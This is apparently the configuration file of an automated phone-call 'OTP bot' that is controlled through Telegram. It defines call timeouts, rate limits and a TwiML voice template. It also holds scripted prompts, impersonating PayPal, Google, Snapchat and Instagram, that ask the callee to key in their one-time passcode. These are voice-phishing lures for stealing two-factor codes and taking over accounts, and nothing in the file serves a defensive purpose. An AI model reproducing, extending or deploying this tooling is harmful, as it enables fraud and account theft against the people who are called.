module.exports = {

 CALL_TIMEOUT: 30,
 RATE_LIMIT: {
   windowMs: 15 * 60 * 1000,
   max: 100,
 },

 SCHEDULE_INTERVAL: 60 * 1000,
 SUPPORTED_PLATFORMS: {
   paypal: 'Please enter your PayPal OTP code followed by the pound sign.',
   google: 'Please enter your Google OTP code followed by the pound sign.',
   snapchat: 'Please enter your Snapchat OTP code followed by the pound sign.',
   instagram: 'Please enter your Instagram OTP code followed by the pound sign.',
 },
 
 DEFAULT_TWIML_MESSAGE: (platformMessage = 'Hello from your Telegram bot!') => `
   
     ${platformMessage}
     
     We did not receive your input. Goodbye.
   
 `,
};